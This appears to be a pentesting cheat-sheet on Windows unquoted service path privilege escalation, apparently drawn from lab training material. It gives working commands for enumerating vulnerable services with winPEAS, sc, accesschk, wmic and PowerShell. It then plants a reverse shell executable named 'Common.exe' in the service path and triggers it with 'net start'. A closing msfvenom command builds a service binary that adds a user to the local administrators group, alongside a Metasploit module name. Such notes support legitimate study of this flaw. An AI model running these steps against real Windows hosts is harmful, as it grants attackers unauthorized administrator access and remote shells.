If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:

```powershell
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```

1.Run winPEAS to check for service misconfigurations:  
`.\winPEASany.exe quiet servicesinfo`

> 2. Note that the “unquotedsvc” service has an unquoted path that  
>     also contains spaces:  
>     C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
>     
>     > No quotes and Space detected
>     

3.Confirm this using sc:  
`sc qc unquotedsvc`

4.Use accesschk.exe to check for write permissions:  
`.\accesschk.exe /accepteula -uwdq C:\`  
`.\accesschk.exe /accepteula -uwdq "C:\Program Files\"`  
`.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`  
5.Copy the reverse shell executable and rename it appropriately:  
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

6.Start a listener on Kali, and then start the service to trigger the exploit:  
`net start unquotedsvc`

List all unquoted service paths, excluding those belonging to built-in Windows services:

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**You can detect and exploit** this vulnerability with metasploit: `exploit/windows/local/trusted\_service\_path` You can manually create a service binary with metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```